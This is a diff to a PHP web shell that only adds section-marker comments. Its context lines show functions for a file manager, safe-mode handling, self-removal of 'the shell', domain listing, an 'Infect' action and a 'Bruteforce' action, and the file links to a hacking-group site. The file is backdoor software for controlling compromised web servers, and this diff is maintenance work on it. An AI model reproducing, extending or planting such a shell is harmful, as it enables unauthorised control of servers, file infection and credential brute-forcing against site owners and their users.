@@ -541,6 +541,7 @@ function actionPhp() {
 }
 // PHP end --------------------
 
+// File manager go --------------------
 function actionFilesMan() {
 	printHeader();
 	echo '<h1>File manager</h1><div class=content>';
@@ -694,6 +695,7 @@ function actionFilesMan() {
 	<?php
 	printFooter();
 }
+// File manager end --------------------
 
 // String tools go --------------------
 function actionStringTools() {
@@ -786,6 +788,7 @@ function actionStringTools() {
 }
 // String tools end --------------------
 
+// File tools go -----------------------
 function actionFilesTools() {
 	if( isset($_POST['p1']) )
 		$_POST['p1'] = urldecode($_POST['p1']);
@@ -937,6 +940,9 @@ function actionFilesTools() {
 	echo '</div>';
 	printFooter();
 }
+// File tools end ----------------------
+
+// Safe mode go ------------------------
 function actionSafeMode() {
 	$temp='';
 	ob_start();
@@ -989,10 +995,16 @@ function actionSafeMode() {
 	echo '</div>';
 	printFooter();
 }
+// Safe mode end ---------------------
+
+// Logout go -------------------------
 function actionLogout() {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 	echo 'bye!';
 }
+// Logout end -------------------------
+
+// Suicide go -------------------------
 function actionSelfRemove() {
 	printHeader();
 	if($_POST['p1'] == 'yes') {
@@ -1004,11 +1016,15 @@ function actionSelfRemove() {
 	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
 	printFooter();
 }
+// Suicide end -------------------------
+
 function actionTools() {
 	printHeader();
 	
 		printFooter();
 }
+
+// Domains go -------------------------
 function actionDomains() {
 	printHeader();
 	error_reporting(0);
@@ -1039,6 +1055,9 @@ href='http://wWw.sEc4EvEr.CoM/'>wWw.sEc4EvEr.CoM</a><br>
 "; 
 	printFooter();
 }
+// Domains end -----------------------
+
+// Infect go -------------------------
 function actionInfect() {
 	printHeader();
 	echo '<h1>Infect</h1><div class=content>';
@@ -1078,6 +1097,7 @@ function actionInfect() {
 		}
 	printFooter();
 }
+// Infect end -----------------------
 
 // Bruteforce go --------------------
 function actionBruteforce() {
